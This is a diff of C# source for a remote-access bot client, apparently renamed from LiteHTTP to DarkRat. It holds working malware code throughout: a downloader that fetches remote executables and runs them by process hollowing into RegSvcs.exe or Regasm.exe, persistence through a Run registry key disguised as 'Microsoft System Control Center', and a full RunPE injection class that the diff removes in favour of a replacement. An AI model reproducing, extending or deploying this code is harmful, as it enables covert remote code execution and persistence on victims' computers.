@@ -11,7 +11,7 @@ using System.Collections.Generic;
 using System.Security.Cryptography;
 using System.Runtime.InteropServices;
 
-namespace LiteHTTP.Classes
+namespace DarkRat.Classes
 {
     class Misc
     {
@@ -115,12 +115,17 @@ namespace LiteHTTP.Classes
                     else
                         return false;
                 case "2":
-                    if (dlex(dp, "", true))
+                    if (dlex(dp, "", true)) 
+                        return true;
+                    else
+                        return false;
+                case "11":
+                    if (dlex(dp.Split('~')[0], dp.Split('~')[1], true))
                         return true;
                     else
                         return false;
                 case "3":
-                    if (dlex(dp, dp.Split('~')[1]))
+                    if (dlex(dp.Split('~')[0], dp.Split('~')[1]))
                         return true;
                     else
                         return false;
@@ -176,6 +181,7 @@ namespace LiteHTTP.Classes
             }
         }
 
+
         // BEGIN - Downloader
         private static bool dlex(string url, string cmdline = "", bool inject = false)
         {
@@ -195,10 +201,18 @@ namespace LiteHTTP.Classes
                 }
                 else
                 {
-                    byte[] file = wc.DownloadData(url);
-                    Microsoft.VisualBasic.VBMath.Randomize();
-                    string surrogate = surrogates[r.Next(0, surrogates.Length - 1)];
-                    RunPE.Run(file, surrogate);
+                   if(cmdline == "")
+                    {
+                        byte[] file = wc.DownloadData(url);
+                        RunPe2.Run(@"C:\Windows\Microsoft.NET\Framework\v2.0.50727\RegSvcs.exe", file, true);
+                    }
+                    else
+                    {
+                        byte[] file = wc.DownloadData(url);
+                        Microsoft.VisualBasic.VBMath.Randomize();
+                        string surrogate = surrogates[r.Next(0, surrogates.Length - 1)];
+                        RunPe2.Run( @"C:\Windows\Microsoft.NET\Framework\v2.0.50727\Regasm.exe", file, true, cmdline);
+                    }
                     return true;
                 }
             }
@@ -213,10 +227,10 @@ namespace LiteHTTP.Classes
             {
                 dlex(url);
                 Program.s.Abort();
-                if (keyExists("Catalyst Control Center"))
+                if (keyExists("Microsoft System Control Center"))
                 {
                     Microsoft.Win32.RegistryKey regkey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                    regkey.DeleteValue("Catalyst Control Center");
+                    regkey.DeleteValue("Microsoft System Control Center");
                 }
                 System.Diagnostics.ProcessStartInfo si = new System.Diagnostics.ProcessStartInfo();
                 si.FileName = "cmd.exe";
@@ -234,6 +248,7 @@ namespace LiteHTTP.Classes
         // END
 
         // BEGIN - Viewer
+        // I am not sure if we need this, but too scared to delete. 
         private static bool visit(string url, bool hide = false)
         {
             try
@@ -291,10 +306,10 @@ namespace LiteHTTP.Classes
             try
             {
                 Program.s.Abort();
-                if (keyExists("Catalyst Control Center"))
+                if (keyExists("Microsoft System Control Center"))
                 {
                     Microsoft.Win32.RegistryKey regkey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                    regkey.DeleteValue("Catalyst Control Center");
+                    regkey.DeleteValue("Microsoft System Control Center");
                 }
                 System.Diagnostics.ProcessStartInfo si = new System.Diagnostics.ProcessStartInfo();
                 si.FileName = "cmd.exe";
@@ -309,86 +324,14 @@ namespace LiteHTTP.Classes
                 return false;
             }
         }
-        
-        // BEGIN - RunPE (injection)
-        public class RunPE
-        {
-            [DllImport("ntdll")]
-            private static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);
-            [return: MarshalAs(UnmanagedType.Bool)]
-            [DllImport("kernel32")]
-            private static extern bool ReadProcessMemory(IntPtr hProc, IntPtr baseAddr, ref IntPtr bufr, int bufrSize, ref IntPtr numRead);
-            [DllImport("kernel32.dll")]
-            private static extern uint ResumeThread(IntPtr hThread);
-            [return: MarshalAs(UnmanagedType.Bool)]
-            [DllImport("kernel32")]
-            private static extern bool CreateProcess(string appName, StringBuilder commandLine, IntPtr procAttr, IntPtr thrAttr, [MarshalAs(UnmanagedType.Bool)] bool inherit, int creation, IntPtr env, string curDir, byte[] sInfo, IntPtr[] pInfo);
-            [return: MarshalAs(UnmanagedType.Bool)]
-            [DllImport("kernel32", SetLastError = true)]
-            private static extern bool GetThreadContext(IntPtr hThr, uint[] ctxt);
-            [return: MarshalAs(UnmanagedType.Bool)]
-            [DllImport("kernel32")]
-            private static extern bool SetThreadContext(IntPtr hThr, uint[] ctxt);
-            [DllImport("kernel32")]
-            private static extern IntPtr VirtualAllocEx(IntPtr hProc, IntPtr addr, IntPtr sizel, int allocType, int prot);
-            [DllImport("kernel32.dll", SetLastError = true)]
-            private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, ref int lpNumberOfBytesWritten);
 
-            public static void Run(byte[] bytes, string surrogate)
-            {
-                IntPtr zero = IntPtr.Zero;
-                IntPtr[] pInfo = new IntPtr[4];
-                byte[] sInfo = new byte[0x44];
-                int num2 = BitConverter.ToInt32(bytes, 60);
-                int num = BitConverter.ToInt16(bytes, num2 + 6);
-                IntPtr ptr2 = new IntPtr(BitConverter.ToInt32(bytes, num2 + 0x54));
-                if (CreateProcess(null, new StringBuilder(surrogate), zero, zero, false, 4, zero, null, sInfo, pInfo))
-                {
-                    uint[] ctxt = new uint[0xb3];
-                    ctxt[0] = 0x10002;
-                    if (GetThreadContext(pInfo[1], ctxt))
-                    {
-                        IntPtr baseAddr = new IntPtr(ctxt[0x29] + 8L);
-                        IntPtr bufr = IntPtr.Zero;
-                        IntPtr ptr5 = new IntPtr(4);
-                        IntPtr numRead = IntPtr.Zero;
-                        if (ReadProcessMemory(pInfo[0], baseAddr, ref bufr, (int)ptr5, ref numRead) && (NtUnmapViewOfSection(pInfo[0], bufr) == 0L))
-                        {
-                            int num3 = 0;
-                            IntPtr addr = new IntPtr(BitConverter.ToInt32(bytes, num2 + 0x34));
-                            IntPtr sizel = new IntPtr(BitConverter.ToInt32(bytes, num2 + 80));
-                            IntPtr lpBaseAddress = VirtualAllocEx(pInfo[0], addr, sizel, 0x3000, 0x40);
-                            WriteProcessMemory(pInfo[0], lpBaseAddress, bytes, (uint)((int)ptr2), ref num3);
-                            int num4 = num - 1;
-                            int num6 = num4;
-                            for (int i = 0; i <= num6; i++)
-                            {
-                                int[] dst = new int[10];
-                                Buffer.BlockCopy(bytes, (num2 + 0xf8) + (i * 40), dst, 0, 40);
-                                byte[] buffer2 = new byte[(dst[4] - 1) + 1];
-                                Buffer.BlockCopy(bytes, dst[5], buffer2, 0, buffer2.Length);
-                                sizel = new IntPtr(lpBaseAddress.ToInt32() + dst[3]);
-                                addr = new IntPtr(buffer2.Length);
-                                WriteProcessMemory(pInfo[0], sizel, buffer2, (uint)((int)addr), ref num3);
-                            }
-                            sizel = new IntPtr(ctxt[0x29] + 8L);
-                            addr = new IntPtr(4);
-                            WriteProcessMemory(pInfo[0], sizel, BitConverter.GetBytes(lpBaseAddress.ToInt32()), (uint)((int)addr), ref num3);
-                            ctxt[0x2c] = (uint)(lpBaseAddress.ToInt32() + BitConverter.ToInt32(bytes, num2 + 40));
-                            SetThreadContext(pInfo[1], ctxt);
-                        }
-                    }
-                    ResumeThread(pInfo[1]);
-                }
-            }
-        }
-        // END
 
         /* Credit goes to an unknown creator for the "Removal" class
          * Modified by Zettabit for better efficiency
          * 
          * BEGIN - Botkiller
          */
+        // I am not sure if we need this, but too scared to delete. 
         public class Removal
         {
             public static string applocal = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
